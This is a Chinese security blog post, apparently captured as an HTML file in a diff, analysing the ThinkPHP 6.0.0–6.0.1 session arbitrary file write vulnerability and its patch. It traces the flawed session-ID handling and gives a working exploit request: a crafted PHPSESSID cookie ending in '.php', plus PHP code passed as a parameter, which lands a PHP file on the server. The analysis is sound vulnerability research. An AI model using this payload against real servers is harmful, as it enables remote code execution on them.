@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>ThinkPHP6 任意文件操作漏洞分析 | ccreaterのblog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="ThinkPHP6 任意文件操作漏洞分析利用条件 ThinkPHP6.0.0-6.0.1 开启Sessoin中间件  漏洞复现官方commit: https:&#x2F;&#x2F;github.com&#x2F;top-think&#x2F;framework&#x2F;commit&#x2F;1bbe75019ce6c8e0101a6ef73706217e406439f2  复现环境为:phpstudy+thinkphp6.0.1 \app\contr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP6 任意文件操作漏洞分析">
+<meta property="og:url" content="https://site.ccreater.top/2020/01/31/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="ccreaterのblog">
+<meta property="og:description" content="ThinkPHP6 任意文件操作漏洞分析利用条件 ThinkPHP6.0.0-6.0.1 开启Sessoin中间件  漏洞复现官方commit: https:&#x2F;&#x2F;github.com&#x2F;top-think&#x2F;framework&#x2F;commit&#x2F;1bbe75019ce6c8e0101a6ef73706217e406439f2  复现环境为:phpstudy+thinkphp6.0.1 \app\contr">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png">
+<meta property="article:published_time" content="2020-01-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-01T16:05:50.683Z">
+<meta property="article:author" content="ccreater">
+<meta property="article:tag" content="cve复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png">
+  
+    <link rel="alternate" href="/atom.xml" title="ccreaterのblog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">ccreaterのblog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://site.ccreater.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-ThinkPHP6 任意文件操作漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/01/31/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
+  <time class="dt-published" datetime="2020-01-31T16:00:00.000Z" itemprop="datePublished">2020-02-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      ThinkPHP6 任意文件操作漏洞分析
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="ThinkPHP6-任意文件操作漏洞分析"><a href="#ThinkPHP6-任意文件操作漏洞分析" class="headerlink" title="ThinkPHP6 任意文件操作漏洞分析"></a>ThinkPHP6 任意文件操作漏洞分析</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
+<li>ThinkPHP6.0.0-6.0.1</li>
+<li>开启Sessoin中间件</li>
+</ol>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>官方commit: <a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a> </p>
+<p>复现环境为:phpstudy+thinkphp6.0.1</p>
+<p><code>\app\controller\index.php</code>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Session</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Session::set(<span class="string">&#x27;name&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,&#x27;</span> . Session::get(<span class="string">&#x27;name&#x27;</span>);;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>\app\middleware.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 全局中间件定义文件</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 全局请求缓存</span></span><br><span class="line">    <span class="comment">// \think\middleware\CheckRequestCache::class,</span></span><br><span class="line">    <span class="comment">// 多语言加载</span></span><br><span class="line">    <span class="comment">// \think\middleware\LoadLangPack::class,</span></span><br><span class="line"><span class="comment">//     Session初始化</span></span><br><span class="line">     \think\middleware\SessionInit::class</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>根据漏洞的信息(任意文件操作),我们从<code>vendor\topthink\framework\src\think\session\Store.php</code> 的<code>save</code>函数开始进行分析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;clearFlashData();<span class="comment">//清除原来的数据</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$sessionId</span> = <span class="keyword">$this</span>-&gt;getId();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler-&gt;write(<span class="variable">$sessionId</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler-&gt;delete(<span class="variable">$sessionId</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;init = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进<code>$this-&gt;handler-&gt;write</code>方法看一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$sessID</span>, <span class="keyword">string</span> <span class="variable">$sessData</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getFileName(<span class="variable">$sessID</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$data</span>     = <span class="variable">$sessData</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = gzcompress(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;writeFile(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>再跟进<code>$this-&gt;writeFile</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$content</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">bool</span>) file_put_contents(<span class="variable">$path</span>, <span class="variable">$content</span>, LOCK_EX);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为<code>$data</code>可控,那么我们只要能控制<code>$path</code>我们就可以写shell进去了</p>
+<p>而<code>$path</code>由<code>$this-&gt;getFileName($sessID, true);</code>得到</p>
+<p>跟进去</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileName</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">bool</span> <span class="variable">$auto</span> = <span class="literal">false</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class="line">           <span class="comment">// 使用子目录</span></span><br><span class="line">           <span class="variable">$name</span> = <span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;prefix&#x27;</span>] . DIRECTORY_SEPARATOR . <span class="string">&#x27;sess_&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable">$name</span> = <span class="string">&#x27;sess_&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;path&#x27;</span>] . <span class="variable">$name</span>;</span><br><span class="line">       <span class="variable">$dir</span>      = dirname(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$auto</span> &amp;&amp; !is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               mkdir(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">           &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">               <span class="comment">// 创建失败</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$filename</code>直接由末端拼接参数<code>$name</code></p>
+<p>而<code>write</code>调用<code>getFileName</code>时直接将参数<code>$sessID</code>传入,<code>$sessID</code>由<code>$sessionId = $this-&gt;getId();</code>获得</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getId</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$this-&gt;id</code>时通过<code>setId()</code>来设置的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setId</span>(<span class="params"><span class="variable">$id</span> = <span class="literal">null</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;id = is_string(<span class="variable">$id</span>) &amp;&amp; strlen(<span class="variable">$id</span>) === <span class="number">32</span> ? <span class="variable">$id</span> : md5(microtime(<span class="literal">true</span>) . session_create_id());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>is_string($id) &amp;&amp; strlen($id) === 32 </code>满足,则直接将<code>$id</code>的值赋给<code>$this-&gt;id</code></p>
+<p>查找调用setId的函数</p>
+<p><img src="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png" alt="image3070"></p>
+<p>其中<code>SessionInit</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// Session初始化</span></span><br><span class="line">       <span class="variable">$varSessionId</span> = <span class="keyword">$this</span>-&gt;app-&gt;config-&gt;get(<span class="string">&#x27;session.var_session_id&#x27;</span>);</span><br><span class="line">       <span class="variable">$cookieName</span>   = <span class="keyword">$this</span>-&gt;session-&gt;getName();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$varSessionId</span> &amp;&amp; <span class="variable">$request</span>-&gt;request(<span class="variable">$varSessionId</span>)) &#123;</span><br><span class="line">           <span class="variable">$sessionId</span> = <span class="variable">$request</span>-&gt;request(<span class="variable">$varSessionId</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable">$sessionId</span> = <span class="variable">$request</span>-&gt;cookie(<span class="variable">$cookieName</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$sessionId</span>) &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;session-&gt;setId(<span class="variable">$sessionId</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查找配置发现<code>$sessionId</code>=&gt;<code>$_COOKIE[&#39;PHPSESSID&#39;]</code></p>
+<p>因此构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp/public/index.php?s=/index/index/&amp;name=%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line">Cookie :PHPSESSID=9f7777c08f3909751b148338ba08.php</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setId</span>(<span class="params"><span class="variable">$id</span>=<span class="literal">null</span></span>):<span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;id = is_string(<span class="variable">$id</span>) &amp;&amp; strlen(<span class="variable">$id</span>) === <span class="number">32</span> &amp;&amp; ctype_alnum(<span class="variable">$id</span>) ? <span class="variable">$id</span> : md5(microtime(<span class="literal">true</span>) . session_create_id());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>setId</code>中增加了对<code>$id</code>的校验:<code>ctype_alnum($id)</code>,只允许数字或字母,来避免任意文件操作</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://paper.seebug.org/1114/#_1">https://paper.seebug.org/1114/#_1</a> </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://site.ccreater.top/2020/01/31/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="cku8k64ay002kczonbvp4e0de" data-title="ThinkPHP6 任意文件操作漏洞分析" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/02/07/phpmyadmin%204.8.1%20rce/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          phpmyadmin 4.8.1 rce
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/01/31/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">ThinkPHP框架5.0.x_SQL注入分析</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li 